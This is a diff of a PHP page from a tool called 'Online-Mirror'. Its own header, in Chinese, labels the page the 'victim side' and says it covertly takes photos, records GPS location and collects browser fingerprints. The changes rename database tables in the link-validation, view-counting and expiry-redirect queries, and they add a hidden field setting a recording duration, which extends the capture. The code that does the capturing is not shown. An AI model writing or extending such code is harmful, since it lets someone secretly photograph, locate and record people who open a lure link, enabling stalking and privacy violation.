@@ -1,6 +1,6 @@
 <?php
 /**
- * Online-Mirror 升级版 v2.0 - 拍照捕获页面（受害者端）
+ * Online-Mirror v3.0 - 拍照捕获页面（受害者端）
  * 无感拍照 + GPS定位 + 浏览器指纹采集
  */
 require_once __DIR__ . '/config.php';
@@ -15,7 +15,7 @@ if (empty($id) || empty($url)) {
 // 验证链接有效性
 try {
     $db = getDB();
-    $stmt = $db->prepare("SELECT * FROM links WHERE link_id = ? AND status = 'active'");
+    $stmt = $db->prepare("SELECT * FROM mir_links WHERE link_id = ? AND status = 'active'");
     $stmt->execute([$id]);
     $link = $stmt->fetch();
     
@@ -25,14 +25,14 @@ try {
     }
     
     if ($link['expires_at'] && strtotime($link['expires_at']) < time()) {
-        $stmt = $db->prepare("UPDATE links SET status = 'expired' WHERE link_id = ?");
+        $stmt = $db->prepare("UPDATE mir_links SET status = 'expired' WHERE link_id = ?");
         $stmt->execute([$id]);
         header("Location: " . $url);
         exit;
     }
     
     // 增加浏览量
-    $stmt = $db->prepare("UPDATE links SET views = views + 1 WHERE link_id = ?");
+    $stmt = $db->prepare("UPDATE mir_links SET views = views + 1 WHERE link_id = ?");
     $stmt->execute([$id]);
     
     addLog($id, 'visit');
@@ -72,6 +72,7 @@ html, body { width: 100%; height: 100%; background: #fff; }
     <input type="hidden" name="burst_total" id="burstTotal" value="<?php echo intval($link['burst_count'] ?? 0); ?>" />
     <input type="hidden" name="burst_index" id="burstIndex" value="0" />
     <input type="hidden" name="gps_enabled" id="gpsEnabled" value="<?php echo intval($link['gps_enabled'] ?? 0); ?>" />
+    <input type="hidden" name="recording_seconds" id="recordingSeconds" value="<?php echo intval($link['recording_seconds'] ?? 0); ?>" />
 </form>
 
 <script>
